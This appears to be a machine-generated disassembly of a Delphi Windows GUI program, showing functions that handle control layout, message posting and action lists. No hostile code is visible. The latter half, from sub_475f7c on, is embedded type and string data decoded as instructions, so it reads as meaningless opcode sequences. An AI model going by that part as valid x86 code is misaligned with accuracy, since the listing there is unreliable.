mov eax ebx
call sub_47ed24
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax [ esp + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
sub edx eax
inc edx
mov ecx esp
mov eax [ ebx + 0x17a ]
call sub_417088
mov eax [ esp ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x176 ] eax
add esp 0x10
pop ebx
retn
adc edx 0x0
sub_475200
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
call sub_404368
xor eax eax
push ebp
push sub_475302
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x30 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
call sub_48060c
cmp [ eax + 0x248 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
mov ecx esi
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_47f838
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edi [ eax + 0x54 ]
lea eax [ ebp + 0x10 ]
mov edx [ ebx + 0x1c8 ]
call sub_403f50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475309
lea eax [ ebp + 0x10 ]
call sub_403eb8
retn
mov edx 0x2
mov eax ebx
call sub_44b2c4
mov esi eax
push esi
push edi
lea esi [ ebx + 0x1b1 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x15
sub eax [ ebx + 0x1b9 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call OffsetRect
mov eax [ ebx + 0x16c ]
mov eax [ eax + 0x54 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
mov ecx esi
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_47f838
sub_475314
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_404368
xor eax eax
push ebp
push sub_4753e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x30 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
call sub_47f7c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
je r-xdata
mov eax ebx
call sub_48060c
cmp [ eax + 0x248 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4753ee
lea eax [ ebp + 0x8 ]
call sub_403eb8
retn
mov edx 0x2
mov eax ebx
call sub_44b2c4
mov [ esi ] eax
push esi
lea esi [ ebx + 0x1b1 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x15
sub eax [ ebx + 0x1b9 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov eax [ ebx + 0x16c ]
mov eax [ eax + 0x54 ]
push eax
mov ecx esi
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_47f7c8
lea eax [ ebp + 0x8 ]
mov edx [ ebx + 0x1c8 ]
call sub_403f50
sub_4753f8
push esi
push edi
mov esi eax
mov eax esi
call sub_47fcf0
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
mov edi [ esi + 0x1ac ]
cmp [ edi + 0x295 ] 0x0
jne r-xdata
mov [ eax + 0x3c ] 0x1
pop edi
pop esi
retn
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x164 ]
sub_475430
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
test eax eax
je r-xdata
xor ebx ebx
call sub_4191a8
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_480834
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_44c070
mov eax [ ebp - 0x4 ]
call sub_48060c
mov eax [ eax + 0x210 ]
call sub_479bf4
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_48060c
mov edi [ eax + 0x214 ]
mov eax edi
mov si 0xffec
call sub_403324
push eax
mov eax [ ebp - 0x4 ]
call sub_48060c
mov eax [ eax + 0x210 ]
call sub_479bf4
mov ecx eax
mov dl 0x1
pop eax
call [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47563b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4755f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_47b780
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x48 ]
mov eax [ ebp - 0x8 ]
call sub_47b4dc
mov eax [ ebp - 0x4 ]
call sub_48060c
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_47b5fc
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_479bf4
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_47baa4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_48060c
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xd4 ]
mov eax [ ebp - 0x10 ]
call sub_47baa4
test eax eax
setg dl
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4755fb
mov eax [ ebp - 0x8 ]
call sub_479bf4
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
call sub_48060c
mov ebx [ eax + 0x214 ]
mov eax ebx
mov si 0xffec
call sub_403324
push eax
mov eax [ ebp - 0x8 ]
call sub_479bf4
mov ecx eax
mov dl 0x1
pop eax
call [ eax + 0x1c ]
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_47ba70
mov edx eax
mov eax ebx
call sub_47b3d0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x5c ]
mov eax ebx
call sub_47b5fc
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4755fb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_48060c
mov eax [ eax + 0x210 ]
call sub_479bf4
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_44c078
mov eax [ ebp - 0x4 ]
call sub_48060c
call sub_477b70
retn
sub_47565c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44a90c
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
push esi
push 0x0
push 0xb403
mov eax [ esi + 0x30 ]
call sub_44f7d8
push eax
call PostMessageA
cmp [ eax + 0x95 ] 0x0
jne r-xdata
mov dl 0x1
call sub_455c28
sub_4756f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46d194
mov [ esi + 0x1b0 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_47572c
push ebx
push esi
push edi
call sub_4034f4
mov ebx edx
mov edi eax
mov esi [ edi + 0x16c ]
test esi esi
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_47ec04
test bl bl
jle r-xdata
mov eax [ esi + 0x18 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034dc
mov eax [ esi + 0x18 ]
mov edx [ eax ]
call [ edx + 0x17c ]
sub_47579c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_46d1fc
cmp [ ebx + 0x1b1 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
mov eax esi
call sub_47b0a8
test eax eax
jne r-xdata
mov eax ebx
call sub_475b18
cmp [ eax + 0x296 ] 0x0
je r-xdata
cmp [ ebx + 0x1b0 ] 0x0
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
push ebx
push 0x0
push 0xb403
mov eax ebx
call sub_48060c
call sub_44f7d8
push eax
call PostMessageA
mov [ ebx + 0x1b0 ] 0x0
mov eax ebx
call sub_475b18
mov edx [ eax ]
call [ edx + 0x17c ]
jmp r-xdata
mov eax ebx
call sub_475b18
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x150 ]
jmp r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
sub_47584c
push ebx
push esi
mov esi eax
mov eax esi
call sub_46d28c
mov eax esi
call sub_475b18
cmp [ eax + 0x297 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov ebx [ esi + 0x16c ]
test ebx ebx
je r-xdata
mov eax esi
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax ebx
call sub_47b0a8
test eax eax
jne r-xdata
cmp [ esi + 0x18a ] 0x0
jne r-xdata
mov eax esi
call sub_475b18
cmp [ eax + 0x296 ] 0x0
je r-xdata
mov [ esi + 0x1b1 ] 0x1
mov eax esi
mov si 0xffeb
call sub_403324
sub_4758c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_480834
mov eax [ ebx + 0x44 ]
add eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_48060c
mov ecx [ ebx + 0x40 ]
add ecx edi
mov edx esi
mov esi [ eax ]
call [ esi + 0xe0 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_48060c
mov [ eax + 0x296 ] 0x0
mov eax ebx
call sub_48060c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_475938
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4801ac
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax ebx
call sub_48060c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ ebx + 0x18a ] 0x0
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032d8
mov esi eax
mov eax [ esi + 0x40 ]
cmp eax [ ebx + 0x16c ]
jne r-xdata
mov [ ebx + 0x1b1 ] 0x1
mov eax ebx
mov si 0xffeb
call sub_403324
mov eax ebx
call sub_48060c
test eax eax
je r-xdata
mov eax ebx
call sub_48060c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
call sub_48060c
mov edx [ r-xdata ]
call sub_4032d8
call sub_4700dc
sub_475a04
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_404368
xor eax eax
push ebp
push sub_475b06
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_403f50
mov esi [ ebx + 0x30 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_47f7c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475b0d
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403edc
lea eax [ ebp + 0x8 ]
call sub_403eb8
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov esi eax
cmp [ esi + 0x248 ] 0x0
jne r-xdata
cmp [ esi + 0x30d ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_45e254
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_403f50
cmp [ ebx + 0x18a ] 0x0
je r-xdata
cmp [ ebx + 0x1ab ] 0x0
jne r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x3c ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_42426c
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_42426c
sub_475b48
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_46d3c0
mov eax esi
call sub_475b18
mov al [ eax + 0x296 ]
mov [ esi + 0x1b0 ] al
mov eax ebx
sub al 0x1
jb r-xdata
cmp [ esi + 0x1b0 ] 0x0
jne r-xdata
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_475b18
cmp [ eax + 0x296 ] 0x0
je r-xdata
jmp r-xdata
push esi
push 0x0
push 0xb403
mov eax esi
call sub_475b18
call sub_44f7d8
push eax
call PostMessageA
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov eax esi
call sub_475b18
mov edx [ eax ]
call [ edx + 0x17c ]
sub_475c04
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov [ esi + 0x1b1 ] 0x0
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_46d4b4
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0x1b0 ] 0x0
je r-xdata
mov eax esi
call sub_475b18
mov edx [ eax ]
call [ edx + 0x17c ]
sub_475c50
push ebx
push esi
mov esi eax
mov bl [ esi + 0x1ae ]
mov eax [ esi + 0x16c ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax esi
call sub_46d5f8
mov [ esi + 0x1ae ] bl
pop esi
pop ebx
retn
mov [ esi + 0x1ae ] 0x2
sub_475c84
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_475d0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ rw-data ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475d13
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_475d18
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x48 ]
retn
mov eax [ rw-data ]
call sub_40d31c
sub_475d54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_475d79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475d80
retn
sub_475f7c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x5f
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
pop edi
inc edi
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
pop esp
sub [ eax ] eax
andps xmm0 [ ecx + 0x63 ]
je r-xdata
pushfd
jl r-xdata
outsd
outsb
inc edx
popad
jb r-xdata
add ah bh
or eax 0x33840042
outsd
outsb
inc edx
popad
jb r-xdata
xchg esp eax
adc [ eax ] al
jo r-xdata
add al bh
lea eax [ ecx ]
fdivr [ ebp + 0x47 ]
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esp + edi * 2 - 0x7207ffb9 ] bl
inc ecx
add al bl
jge r-xdata
test [ ebx ] dh
je r-xdata
call 0xffffffff8c47a11b
add [ eax ] al
add [ eax + eax ] al
add al dh
jl r-xdata
add ah cl
add [ eax ] al
add [ edx + ecx * 2 + 0x45 ] bh
add [ esp + edx - 0x72bbffbe ] bh
inc edi
je r-xdata
add [ eax ] al
out dx eax
mov [ eax ] es
add [ eax ] al
add al 0x0
add [ ecx + eax * 4 + 0x47 ] dh
add [ edx + eax * 4 ] dh
inc edi
add [ eax - 0x6fffbdef ] bl
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax - 0x7bffb885 ] bl
mov al [ edi ]
cmp al 0x86
inc edi
add al al
mov [ edi ] al
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
cwde
adc [ edx ] eax
nop
insb
les ebx [ gs : edi + 0x47 ]
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
lea eax [ eax ]
pop eax
pushad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x60e40047 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x37ffb8a0 ] ch
pushad
inc edi
insb
in al 0x5f
inc edi
add [ edi ] al
andps xmm0 [ ecx + 0x63 ]
sub_4760b6
in al dx
[ ebx + ecx * 4 ]
inc edi
add [ eax - 0x75 ] dl
inc edi
add [ edx + ecx * 4 - 0x751fffb9 ] ah
inc edi
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
inc esp
lea eax [ edi ]
cld
je r-xdata
inc edi
add [ edi ] al
push cs
add al dh
jl r-xdata
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esp + edi * 2 - 0x7207ffb9 ] bl
inc ecx
add al bl
jge r-xdata
inc edx
add [ ebp + ecx * 4 + 0x47 ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
popad
outsb
popad
jb r-xdata
inc edi
add ah al
mov eax [ edi ]
dec eax
mov al [ edi ]
mov [ ebx + 0x47 ] cs
add [ eax - 0x80000000 ] al
add al 0x0
adc [ ecx + ebp * 2 + 0x6e ] ecx
imul esp [ ebp + 0x64 ] 0x41
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x4564b073
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6d490600
popad
jae r-xdata
popad
inc edi
add al ah
pushad
inc edi
add [ edx ] dl
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
adc [ eax ] al
call 0xffffffff8c47a245
add [ eax ] al
dec [ eax + eax + 0x1ff00 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ esi + 0x69 ] al
insb
dec esi
popad
insd
adc al 0x6b
inc edi
add [ eax + eax ] ch
[ esi + eax * 4 ]
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
popad
outsb
popad
jb r-xdata
add [ ecx + eax * 4 + 0x47 ] dh
add [ edx + eax * 4 ] dh
inc edi
add [ eax - 0x6fffbdef ] bl
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax - 0x7bffb885 ] bl
mov al [ edi ]
cmp al 0x86
inc edi
add al al
mov [ edi ] al
push cs
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
popad
add [ eax - 0x6fffbdef ] bl
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax - 0x7bffb885 ] bl
mov al [ edi ]
cmp al 0x86
inc edi
add al al
mov [ edi ] al
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
call 0xffffffff8c47a11b
add [ eax ] al
add [ eax + eax ] al
out dx eax
inc eax
add ah ah
pushad
inc edi
add [ edi ] al
adc al 0x54
inc ebx
jne r-xdata
mov [ edi ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] dl
push eax
jb r-xdata
inc cx
add [ eax + eax - 0x78af0100 ] dl
inc edi
add [ eax + 0x4789 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50100006 ] al
add ah bh
or al 0x60
lodsb [ esi ]
popad
lea eax [ ecx ]
fdivr [ ebp + 0x47 ]
je r-xdata
outsb
inc ebx
push 0x65676e61
in al 0x49
outsd
jb r-xdata
add al bh
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
popad
outsb
popad
jb r-xdata
add [ eax ] eax
arpl [ ebp + 0x74 ] si
add [ gs : esi + 0x47 ] bl
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax ] cl
add bh bh
popad
outsb
in al 0x49
je r-xdata
add ah bl
xor [ eax ] al
pushfd
jl r-xdata
inc edi
add [ esp + edx - 0x72bbffbe ] bh
inc edi
pushad
inc edi
add [ ebx + ecx * 2 ] ch
inc ebp
add [ edx ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add [ eax ] al
mov eax eax
pop esp
popad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
popad
inc edi
add al dl
add [ eax ] al
add [ eax ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ ebp + 0x6e ] 0x6c437374
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] ecx
push ebx
arpl [ eax + 0x65 ] bp
jne r-xdata
outsb
popad
jb r-xdata
add al dl
inc edi
popad
je r-xdata
inc ebx
rcr [ esi + 0x47 ] 0x1
add [ eax - 0x4f010000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f14000e ] al
or eax 0x6e4f1100
inc edi
je r-xdata
je r-xdata
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09000a ] al
outsb
sub [ gs : edx + 0x45 ] cl
add [ eax ] bl
add bh bh
sbb [ eax + 0x45 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
add [ 0x74617453 ] al
loopne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
andps xmm0 [ ecx + 0x63 ]
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + edx * 4 + 0x41 ] dl
add al bh
lea eax [ ecx ]
add [ esi - 0x71afffbf ] cl
inc edi
add [ eax - 0x71 ] bl
inc edi
add [ eax - 0x2fffbe6e ] ah
xchg edx eax
inc ecx
add al cl
xchg edx eax
inc ecx
add [ ecx + edx * 4 ] bl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x14004764 ] bh
add [ eax ] al
add [ ecx + 0x41 ] ch
add [ eax + 0x33 ] dh
inc eax
loopne r-xdata
add [ eax ] al
insb
inc ebx
push 0x65676e61
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax 0x74536e4f
popad
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
inc ebx
insb
popad
jae r-xdata
outsb
inc edi
add bh bh
add [ eax ] eax
insd
inc ebx
insb
popad
jae r-xdata
js r-xdata
inc edi
add al cl
add [ eax ] al
inc [ eax + 0x100478d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050008 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070001 ] al
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
mov eax eax
shl [ edi + eax * 2 ] 0x1
pop es
andps xmm0 [ ecx + 0x63 ]
je r-xdata
add [ eax ] al
add [ eax ] al
test al 0x64
inc edi
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
